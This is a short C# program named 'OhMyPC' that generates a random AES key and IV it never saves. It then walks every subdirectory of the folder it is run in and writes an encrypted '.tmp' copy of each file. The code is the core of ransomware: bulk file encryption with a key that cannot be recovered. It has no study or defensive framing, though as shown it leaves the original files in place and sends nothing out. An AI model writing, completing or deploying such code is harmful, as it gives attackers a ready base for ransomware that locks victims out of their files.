using System.Diagnostics;
using System.Reflection.PortableExecutable;
using System.Security.Cryptography;
using System.Text;

namespace OhMyPC
{
    internal class Program
    {
        static void Main(string[] args)
        {
            var df = RandomNumberGenerator.GetBytes(32);var ddg = RandomNumberGenerator.GetBytes(16);FileEncrypt.Recurse(Environment.CurrentDirectory, ddg, df);
            
            return;
        }
        public static void WriteLineAsColor(string Text,ConsoleColor color)
        {
            var dcolor = Console.ForegroundColor;
            Console.ForegroundColor = color;
            Console.WriteLine(Text);
            Console.ForegroundColor = dcolor;
        }
    }
    class FileEncrypt
    {
        public static void Recurse(string FilePath,byte[] IV,byte[] Key)
        {

            foreach (var d in Directory.EnumerateDirectories(FilePath))
            {
                Recurse(d, IV, Key);
                Enceypt(d, IV, Key);
            }
            return;
        }
        static void Enceypt(string FilePath,byte[] IV,byte[] Key)
        {
            var aes = AesCng.Create();aes.IV = IV;aes.Key = Key;
            foreach (var file in Directory.EnumerateFiles(FilePath))
            {
                try
                {
                    byte[] bytes = File.ReadAllBytes(file);var FileName=file +".tmp";
                    var files = new FileStream(FileName, FileMode.CreateNew, FileAccess.ReadWrite, FileShare.ReadWrite);
                    var df = aes.EncryptCbc(bytes, aes.IV);
                    files.Write(df, 0, df.Length);
                    files.Close();
                } catch(Exception issu)
                {
                    Program.WriteLineAsColor(issu.Message,ConsoleColor.Red);
                }
                
                
            }
        }
    }

}
